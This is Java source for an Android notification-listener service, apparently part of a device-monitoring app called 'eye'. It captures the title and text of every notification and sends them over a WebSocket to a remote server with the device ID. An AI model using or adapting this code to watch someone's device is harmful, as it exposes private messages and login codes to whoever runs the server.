package com.idsiber.eye;

import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * Service to capture and manage notifications
 */
public class IdSiberNotificationListener extends NotificationListenerService {
    private static final String TAG = "IdSiberNotifListener";
    private static IdSiberNotificationListener instance;
    private static final List<StatusBarNotification> capturedNotifications = new ArrayList<>();
    private static final int MAX_STORED_NOTIFICATIONS = 100; // Maximum notifications to store in memory
    private WebSocketClient wsClient;
    private ServerConfig serverConfig;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationListener service created");
        instance = this;
        serverConfig = new ServerConfig(this);
        wsClient = new WebSocketClient(this, new WebSocketClient.StatusCallback() {
            @Override
            public void onStatusChange(String status) {
                // Not needed for this service
            }

            @Override
            public void onError(String error) {
                Log.e(TAG, "WebSocket error: " + error);
            }
        });
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.d(TAG, "NotificationListener service bound");
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.d(TAG, "Notification posted: " + sbn.getPackageName());
        
        // Store notification in our list
        synchronized (capturedNotifications) {
            // Add to front of list (most recent first)
            capturedNotifications.add(0, sbn);
            
            // Keep only the most recent notifications
            if (capturedNotifications.size() > MAX_STORED_NOTIFICATIONS) {
                capturedNotifications.remove(capturedNotifications.size() - 1);
            }
        }
        
        // Send notification to server
        try {
            JSONObject notificationData = convertNotificationToJson(sbn);
            sendNotificationToServer(notificationData);
        } catch (JSONException e) {
            Log.e(TAG, "Error converting notification to JSON", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
        
        // Remove from our list
        synchronized (capturedNotifications) {
            for (int i = 0; i < capturedNotifications.size(); i++) {
                StatusBarNotification stored = capturedNotifications.get(i);
                if (stored.getKey().equals(sbn.getKey())) {
                    capturedNotifications.remove(i);
                    break;
                }
            }
        }
    }

    /**
     * Get all currently stored notifications
     */
    public static JSONArray getAllNotifications() throws JSONException {
        JSONArray notificationsArray = new JSONArray();
        
        synchronized (capturedNotifications) {
            for (StatusBarNotification sbn : capturedNotifications) {
                notificationsArray.put(convertNotificationToJson(sbn));
            }
        }
        
        return notificationsArray;
    }

    /**
     * Convert a StatusBarNotification to JSON format
     */
    private static JSONObject convertNotificationToJson(StatusBarNotification sbn) throws JSONException {
        JSONObject notificationData = new JSONObject();
        
        // Basic information
        notificationData.put("id", sbn.getId());
        notificationData.put("key", sbn.getKey());
        notificationData.put("package_name", sbn.getPackageName());
        notificationData.put("post_time", sbn.getPostTime());
        notificationData.put("is_ongoing", sbn.isOngoing());
        notificationData.put("is_clearable", sbn.isClearable());
        
        // Extract notification content
        if (sbn.getNotification() != null) {
            JSONObject notification = new JSONObject();
            
            // Extract title and text if available
            if (sbn.getNotification().extras != null) {
                String title = sbn.getNotification().extras.getString("android.title");
                CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
                String bigText = sbn.getNotification().extras.getString("android.bigText");
                
                notification.put("title", title != null ? title : "");
                notification.put("text", text != null ? text.toString() : "");
                notification.put("big_text", bigText != null ? bigText : "");
            }
            
            // Get notification flags
            notification.put("when", sbn.getNotification().when);
            notification.put("number", sbn.getNotification().number);
            notification.put("flags", sbn.getNotification().flags);
            
            // Channel ID (Android O+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                notification.put("channel_id", sbn.getNotification().getChannelId());
            }
            
            notificationData.put("notification", notification);
        }
        
        return notificationData;
    }

    /**
     * Send notification data to server
     */
    private void sendNotificationToServer(JSONObject notificationData) {
        try {
            // Connect if not connected
            if (!wsClient.isConnected()) {
                wsClient.connect();
            }
            
            // Create notification event payload
            JSONObject payload = new JSONObject();
            payload.put("device_id", getDeviceId());
            payload.put("notification_data", notificationData);
            
            // Send via WebSocket
            if (wsClient.isConnected()) {
                wsClient.sendNotification(payload);
            } else {
                Log.e(TAG, "WebSocket not connected, can't send notification");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending notification to server", e);
        }
    }

    /**
     * Get device ID for the notification
     */
    private String getDeviceId() {
        return android.provider.Settings.Secure.getString(
            getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        );
    }

    /**
     * Check if the notification listener service is active
     */
    public static boolean isNotificationListenerEnabled() {
        return instance != null;
    }
}